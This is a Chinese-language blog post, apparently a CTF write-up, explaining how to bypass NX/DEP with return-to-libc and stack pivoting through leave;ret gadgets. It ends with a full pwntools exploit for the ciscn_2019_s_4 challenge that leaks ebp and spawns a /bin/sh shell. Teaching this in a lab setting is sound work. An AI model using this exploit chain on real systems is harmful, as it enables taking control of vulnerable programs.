<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>alazymachine</title>
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>
<header class="header">
    <div class="header-inner">
        <div class="header-title">

        </div>
        <nav class="header-nav">
            
            <a href="/" class="header-nav-link" >
                首页
            </a>
            

            
            <a href="/archives" class="header-nav-link">
                归档
            </a>
            

            
            <a href="/tags" class="header-nav-link">
                标签
            </a>
            

            
        </nav>
    </div>
</header>
<header class="mobile-header">
    <div class="mobile-nav">
        <div class="mobile-nav-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="mobile-nav-title">
            <a href="/" class="mobile-nav-title-link">alazymachine's Blog</a>
        </div>

    </div>
    <nav class="mobile-menu">
        <ul class="mobile-menu-list">
            <li class="mobile-menu-item">
                <i class="iconfont icon-home"></i>
                <a href="/" class="mobile-nav-link">首页</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-archive"></i>
                <a href="/archives" class="mobile-nav-link">归档</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-tag"></i>
                <a href="/tags" class="mobile-nav-link">标签</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-about"></i>
                <a href="/about/" class="mobile-nav-link">关于</a>
            </li>
        </ul>
    </nav>
</header>
<div class="main">
    <div class="content-inner">
        <div class="posts">
    <article class="post-whole">
        <div class="post-title">
            <h2 class="title">bypass-NX</h2>
            <div class="post-meta">
                <span class="post-time">2023-05-02</span>
                
                <span class="post-visit"> 阅读次数：<span id="busuanzi_value_page_pv"></span></span>
            </div>
        </div>
        <div class="post-toc" id="post-toc">
    <strong class="post-toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-NX%EF%BC%88DEP%EF%BC%89"><span class="toc-text">Bypass NX（DEP）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2019-s-4"><span class="toc-text">例题 ciscn_2019_s_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></li></ol>
    <div class="back-to-top" id="back-to-top">
        <a href="javascript:void(0);">回到顶部</a>
    </div>
</div>
        <div class="post-content">
            <h2 id="Bypass-NX（DEP）"><a href="#Bypass-NX（DEP）" class="headerlink" title="Bypass NX（DEP）"></a>Bypass NX（DEP）</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​	栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的<strong>SIGSEGV</strong> 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>​	既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p>
<p><strong>least privilege &amp; seteuid(getuid())</strong></p>
<p>​	在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token function">system</span><span class="token punctuation">(</span>“sh”<span class="token punctuation">)</span>
<span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>但是存在问题，setuid的参数是\x00，但是strcpy在遇到\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p>
<ul>
<li>ESP lifting (ESP抬升)</li>
<li>Frame Faking(栈帧伪造)</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></li>
</ul>
<p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leave:
        move esp,ebp ; 恢复栈顶指针
        pop ebp ;(esp=esp+4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp,ebp --&gt; old_ebp
        --&gt; ret_addr
        --&gt; arg1 :此处是指向system字符串参数的指针
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="例题-ciscn-2019-s-4"><a href="#例题-ciscn-2019-s-4" class="headerlink" title="例题 ciscn_2019_s_4"></a>例题 ciscn_2019_s_4</h3><p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png" alt="image-20230504193243253"></p>
<p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p>
<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png" alt="image-20230504193612815"></p>
<p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置
...
ebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
	   [ret_add] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: 
	mov esp,ebp
----------------------------------------------
ebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
	   [new_ret_addr] ; 记录当前的返回地址
----------------------------------------------
inst: 
	pop ebp
----------------------------------------------
ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论
esp -&gt; [new_ret_addr] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: 
	mov esp,ebp
----------------------------------------------
ebp,esp = buff_ ; 执行结束后完成将esp的抬升
----------------------------------------------
inst: 
	pop ebp
----------------------------------------------
esp = buff_ ;  
ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
	静态查找leave ret指令地址
'''</span>
system_addr <span class="token operator">=</span> <span class="token number">0x8048400</span>
leave_ret_addr<span class="token operator">=</span><span class="token number">0x080484B8</span>
ret_addr <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
	第一次直接构造和buff长度相同的输入，printf时会输出后续内容
'''</span>
payload <span class="token operator">=</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
	接收泄露的ebp输出
'''</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">)</span>
ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
	这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38
'''</span>
fake_ebp <span class="token operator">=</span> ebp <span class="token operator">-</span><span class="token number">0x38</span>
<span class="token triple-quoted-string string">'''
	构造第二次输入的payload
'''</span>
payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment"># ret addr</span>
payload<span class="token operator">+=</span><span class="token string">b'aaaa'</span> <span class="token comment"># junk ret addr 用于模拟call system时的压入返回值操作</span>
payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span>
payload<span class="token operator">+=</span><span class="token string">b'/bin/sh\x00'</span> <span class="token comment"># payload</span>
payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token comment"># 这里对当前的栈进行补齐操作</span>
payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span>
payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>leave_ret_addr<span class="token punctuation">)</span> <span class="token comment"># 填入leave ret返回值</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意两个关键位置：</p>
<p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p>
<p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=">https://blog.csdn.net/sea_time/article/details/106142971</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></p>

        </div>
        
        <div class="post-tag">
            
            <a class="tag" href="/tags/bypass/" title="bypass">bypass</a>
            
        </div>
        
    </article>
</div>
<div class="paginator">
    
        
            <a class="prev" href="/2023/05/02/cfi-sec/">
                <i class="iconfont icon-prev"></i>
                <span class="nav-default">CFI-Sec</span>
                <span class="nav-mobile">上一篇</span>
            </a>
        
        
            <a class="next" href="/2023/05/02/personal-plan/">
                <span class="nav-default">personal_plan</span>
                <span class="nav-mobile">下一篇</span>
                <i class="iconfont icon-next"></i>
            </a>
        
    
</div>
<div id="comment-container"></div>
    </div>
</div>
<footer class="footer-social">
    

    

    

    <div class="footer-copyright">
        <p class="time-line">
            &copy;
            
            
            2024
            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
            <a target="_blank" href="https://github.com/iJinxin">alazymachine</a>
        </p>
        <p class="theme-info">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
        </p>
    </div>
</footer>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
    

</script>
</html>
